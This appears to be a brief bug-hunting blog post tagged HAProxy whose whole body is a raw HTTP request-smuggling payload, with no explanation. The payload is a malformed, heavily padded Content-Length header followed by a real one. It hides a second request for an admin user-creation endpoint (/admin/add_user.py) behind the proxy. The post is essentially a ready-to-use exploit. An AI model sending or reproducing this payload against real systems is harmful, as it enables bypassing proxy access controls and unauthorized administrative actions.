---
title: HAProxy
tags: [bug hunting, haproxy]
categories: [bug hunting, HAProxy]
date: 2022-05-08 11:33:00
---


POST /index.html HTTP/1.1
Host: abc.com
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 60
 
GET /admin/add_user.py HTTP/1.1
Host: abc.com
abc: xyz
